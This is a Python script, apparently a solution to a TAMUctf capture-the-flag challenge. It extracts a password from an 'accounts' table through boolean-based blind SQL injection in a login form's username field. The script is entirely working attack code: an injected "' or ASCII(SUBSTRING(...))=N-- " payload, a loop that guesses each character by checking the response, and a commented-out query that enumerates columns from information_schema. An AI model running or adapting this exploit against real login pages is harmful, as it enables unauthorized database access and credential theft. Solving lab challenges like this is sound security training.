#! /usr/bin/python3
import requests
import string

def inject(cmd):
    url =  "http://passwordextraction.tamuctf.com/login.php"
    data = {
        "username":"' {}-- ".format(cmd),
        "password":"leetcode"
        }
    #print(data)
    r = requests.post(url,data=data)
    valid = "You've successfully authorized, but that doesn't get you the password."
    if(valid in r.text):
        return True
    else:
        return False

#cmd = "or ASCII(SUBSTRING((SELECT concat(column_name) FROM information_schema.columns where table_name=0x6163636f756e7473 LIMIT 0,1),{},{}))={}".format(j,j,ord(i))
table="accounts"
column_1="username"
column_2="password"

if __name__=="__main__":
    TABLE=""
    for j in range(1,30):
        for i in string.printable:
            print(TABLE+i,end="\r")
            cmd = "or ASCII(SUBSTRING((SELECT concat(password) from accounts  LIMIT 0,1),{},{}))={}".format(j,j,ord(i))
            if(inject(cmd)):
                TABLE+=i
                print(TABLE)
                break

print(TABLE)
